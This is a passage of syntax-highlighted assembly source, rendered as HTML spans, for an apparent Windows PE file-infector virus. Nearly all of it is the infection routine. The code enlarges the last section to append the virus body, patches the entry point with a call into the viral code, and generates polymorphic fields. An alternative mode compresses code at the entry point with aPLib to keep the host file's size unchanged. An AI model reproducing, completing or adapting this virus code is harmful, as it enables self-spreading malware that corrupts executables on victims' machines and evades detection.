   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_last_section</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_close_file</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_open_write</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc1">;  EBP - last section header</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_virtual_raw</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">;  RVA virus</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_loader_memory_protect?_dif</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_flechal_rva</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_poly_fields</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_re_size</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageNtHeader</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_last_section</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_virtual_raw</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_virtual_raw</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_re_align</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_section_size</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_re_align</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_virtual_raw</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_flechal_rva</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc1">;  &lt;---temporary - start of poly code</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc0">   </span><span class="sc1">;  &lt;---temporary - poly code </span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">   </span><span class="sc1">;  00401bdc</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_viral_temp_buffer_1</span><span class="sc0">   </span><span class="sc1">;  &lt;---temporary - _viral_pack_packet_addr</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_viral_temp_sz</span><span class="sc0"> </span><span class="sc1">; &lt;--temporary _viral_pack_packet_sz</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DONE</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc5">_no_export</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EXPORT_DIRECTORY_NOT_FOUND</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc1">;  export directory not found</span><span class="sc0">
   </span><span class="sc1">;  sfc protection not found</span><span class="sc0">
   </span><span class="sc1">;  entry point found (probably .EXE file)</span><span class="sc0">

   </span><span class="sc1">;  we've to try to infect this file compressing</span><span class="sc0">
   </span><span class="sc1">;  from the entry-point to the end of the section</span><span class="sc0">
   </span><span class="sc1">;  keeping the original file size</span><span class="sc0">

   </span><span class="sc1">;  infection flag - 2</span><span class="sc0">

   </span><span class="sc6">nop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_mode_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECT</span><span class="sc4">|</span><span class="sc5">MD</span><span class="sc4">|</span><span class="sc2">2</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">__entry</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_loader_memory_protect?_dif</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_EP_section</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">   </span><span class="sc1">;  min. size</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc1">;  ESI points to the section header from</span><span class="sc0">
   </span><span class="sc1">;  entrypoint</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc1">;  enough space to compress ?</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">500</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_mem_total</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_section_size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_loader_memory_protect?</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc1">;  compression starts here</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_1</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_compress_addr_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workmem</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_1</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_compress_addr_1</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_ap_pack</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_4</span><span class="sc0">

   </span><span class="sc1">;  we need to generate a poly loader</span><span class="sc0">
   </span><span class="sc1">;  and adjust some offsets</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_poly_fields</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_1</span><span class="sc0">   </span><span class="sc1">;  size to pack</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">_infect_end_4</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_2</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">_infect_end_4</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">try</span><span class="sc4">|</span><span class="sc5">to</span><span class="sc4">|</span><span class="sc5">infect</span><span class="sc4">|</span><span class="sc10">?</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_infect_end_4</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_close_file</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_open_write</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_4</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageNtHeader</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_4</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">_mem_total</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">;  &lt;---temporary - poly code </span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc1">;  &lt;---temporary - start of poly code</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_compress_addr_1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_compress_space_2</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_viral_temp_buffer_1</span><span class="sc0">   </span><span class="sc1">;  &lt;---temporary - _viral_pack_packet_addr</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_viral_temp_sz</span><span class="sc0"> </span><span class="sc1">; &lt;--temporary _viral_pack_packet_sz</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DONE</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">_infect_end_4</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_compress_addr_1</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc5">_infect_end_3</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_file_infect</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">

   </span><span class="sc5">_infect_end_2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_imagehlp</span><span class="sc0">
